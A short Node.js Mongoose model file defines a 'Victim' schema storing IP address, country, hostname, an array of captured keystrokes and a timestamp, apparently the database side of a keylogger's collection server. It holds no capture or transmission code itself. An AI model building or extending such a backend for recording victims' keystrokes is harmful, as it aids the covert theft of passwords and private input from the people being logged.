const mongoose = require("mongoose");

const victimSchema = new mongoose.Schema({
  ip: String,
  country: String,
  hostname: String,
  keystrokes: [String],
  timestamp: String
});

module.exports = mongoose.model("Victim", victimSchema);
